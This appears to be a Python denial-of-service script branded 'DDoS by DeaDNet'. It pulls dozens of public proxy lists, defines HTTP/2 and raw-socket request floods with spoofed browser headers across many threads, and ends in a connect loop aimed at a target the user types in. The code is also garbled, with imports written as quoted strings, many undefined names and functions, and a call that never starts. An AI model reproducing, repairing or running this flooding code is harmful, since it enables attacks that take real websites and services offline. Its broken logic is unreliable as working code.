# Imports
import socket
"import wget"
from itertools import count
import shutil
"import requests as r, os, threading, random"
"import shutup; shutup.please() # pip3 install shutup"
from threading import Thread
import cmd
"from pystyle import Colors, Colorate, Center"
"import colorama"
"import requests"
"import random"
import string
import sys
"import pcpy"
import time
import os
import urllib.request
import re
from os import system, name, mkdir,rmdir
"import httpx"
"import undetected_chromedriver as webdriver"
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests
print("DDoS Layer7:")
print(red + f"DDoS by DeaDNet")
upl = input(cyan + "[DATA]  UPL: ")
THEARD = int(input(yellow + "[DATA]  Theards: "))

method = input(white + "[DATA]  method: ")

method = input(black + "[proxy]  proxy.txt: ")
#proxy
proxies = {
    'http': '8.8.8.8:9000',
    'http': '7.6.5.4:9000'
}
proxies = []
for proxy in proxies:
    response = requests.get(proxies=proxy)
    if response.status_code == requests.codes['ok']:
        break
        proxyResources = [
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
]
proxy_resources = [
    'https://www.proxyscan.io/download?type=socks4',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt',
    'https://api.openproxylist.xyz/socks4.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt',
    'https://api.openproxylist.xyz/socks5.txt',
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
    'https://www.proxyscan.io/download?type=http',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
    'https://api.openproxylist.xyz/http.txt',
    'https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt',
    'http://alexa.lr2b.com/proxylist.txt',
    'http://rootjazz.com/proxies/proxies.txt',
    'http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://proxy-spider.com/api/proxies.example.txt',
    'https://multiproxy.org/txt_all/proxy.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt',
    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt',
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all',
    'https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies2.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies3.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies4.txt'
]
def steal_proxies(site):
    try:
        data = requests.get(site)
        text_for_parse = data.text
        res = text_for_parse.split()
        with open('proxy.txt', 'a', encoding='utf8', errors='ignore') as proxy_file:
            proxy_file.writelines('\n'.join(res))
        return True
    except Exception as Error:
        return Error


def count_proxies():
    try:
        proxies = sum(1 for line in open('proxy.txt', 'r'))
        return proxies
    except Exception as Error:
        return Error
#methods
def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def test1(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    #req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=test2,args=(until, target, req,))
            thd.start()
        except:  
            pass

def test2(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)           
            
        except:
            pass
"response.text"
# Stats
sent = 0
error = 0
#packets
"import httpx"
"import pystyle"
"import socks"
"import pysocks"
"import requests"
"import icmplib"
"import dnspython"
"import cloudscraper"
"import colorama"
"import shutup"
"import undetected_chromedriver"
"import psutil"
"import flask"
"import wget"
# DDoS
print(  "Zapusk")
while True:
    try:
        s = socket.socket(999999999)
        s.connect((upl, int(theard)))
        sent +=0
        print(green + f"[LOG] GO {sent} ")
        print("DDoS")
    except OSError: 
        error +=1
        print(pink + f"[DDoS] PACKETS {error}")
        "print(cyan + f( DDoS)"

if __name__ == '__main__':
	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco. 
